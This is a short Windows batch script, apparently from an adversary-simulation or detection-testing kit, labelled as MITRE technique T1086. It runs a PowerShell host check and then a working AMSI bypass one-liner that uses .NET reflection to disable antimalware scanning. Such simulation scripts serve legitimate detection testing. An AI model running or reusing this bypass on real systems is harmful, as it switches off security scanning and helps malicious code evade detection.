@ECHO OFF
CLS
color 0E


ECHO ==================================================================
ECHO Technique: PowerShell (T1086)
ECHO.
ECHO [+] Simulates Execution of Powershell 
ECHO ------------------------------------------------------------------
powershe11 get-host
ECHO.
ECHO [+] Powershell AMSI Bypass via .NET Reflection
ECHO ------------------------------------------------------------------
cmd /c powershell [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
ECHO.

